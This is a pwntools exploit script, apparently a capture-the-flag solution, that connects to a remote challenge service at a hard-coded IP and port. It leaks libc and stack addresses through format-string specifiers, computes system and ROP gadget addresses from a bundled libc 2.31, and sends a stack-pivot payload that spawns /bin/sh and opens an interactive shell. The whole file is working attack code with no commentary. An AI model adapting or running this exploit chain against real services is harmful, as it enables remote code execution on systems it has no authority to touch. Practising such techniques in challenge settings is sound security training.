from pwn import *
# p = process("./chall")
p = remote("15.164.30.24", 9050)
libc = ELF("./libc-2.31.so")

p.sendafter(b"where are you?: ", b"%3$p")
# print(p.recv())
p.recvuntil(b"0x")
libc_leak = int(p.recvn(12), 16)
libc_base = libc_leak - 0x10e1f2
success("libc_base: " + hex(libc_base))

p.sendafter(b"pardon?: ", b"%2p")
p.recvuntil(b"0x")
stack_leak = int(p.recvn(12), 16)
rsp = stack_leak
rbp = rsp + 0x60
success("rsp: " + hex(rsp))
success("rbp: " + hex(rbp))

system = libc_base + libc.symbols["system"]
exit = libc_base + libc.symbols["exit"]

pop_rdi = libc_base + 0x23b6a
nop = libc_base + 0x319bf
leave = libc_base + 0x578c8


payload = b"/bin/sh\x00" + p64(pop_rdi) + p64(rbp - 0x30) + p64(nop)
payload += p64(system) + b"A" * 0x8 + p64(rbp - 0x30) + p64(leave)
p.recvuntil(b"Leave final message: ")
p.send(payload)

p.interactive()
